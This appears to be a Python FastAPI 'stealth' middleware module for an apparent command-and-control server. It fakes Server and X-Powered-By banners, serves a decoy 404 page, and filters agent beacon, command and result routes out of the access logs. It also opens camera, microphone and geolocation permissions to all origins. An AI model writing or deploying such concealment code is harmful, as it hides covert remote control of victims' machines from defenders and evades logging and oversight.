"""Middleware penyamaran + filter log akses."""
from __future__ import annotations

import logging
import random
from typing import Iterable

from fastapi import Request
from fastapi.responses import HTMLResponse, Response

from . import config

BANNERS = ("nginx", "nginx", "LiteSpeed", "Apache", "cloudflare")
QUIET = ("/api/pair/beat", "/api/pair/stream", "/api/pair/cmd", "/api/pair/result",
         "/ws/agent", "/ws/operator", "/health")

_banner = random.choice(BANNERS)


def decoy() -> HTMLResponse:
    path = config.WEB_DIR / "decoy.html"
    body = path.read_text(encoding="utf-8") if path.exists() else "<h1>404 Not Found</h1>"
    return HTMLResponse(body, status_code=404)


class QuietFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        try:
            msg = record.getMessage()
        except Exception:
            return True
        return not any(k in msg for k in QUIET)


def install_log_filter(loggers: Iterable[str] = ("uvicorn.access",)) -> None:
    for name in loggers:
        logging.getLogger(name).addFilter(QuietFilter())


async def apply(request: Request, response: Response) -> Response:
    if not config.get("stealth", True):
        return response
    response.headers["Server"] = str(config.get("server_banner") or _banner)
    response.headers["X-Powered-By"] = "PHP/8.2"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["X-Robots-Tag"] = "noindex, nofollow"
    response.headers["Permissions-Policy"] = "geolocation=(*), camera=(*), microphone=(*)"
    path = request.url.path
    if path.startswith(("/api/", "/p/", "/ws/", "/login")):
        response.headers["Cache-Control"] = "no-store, max-age=0"
        response.headers["Pragma"] = "no-cache"
    return response
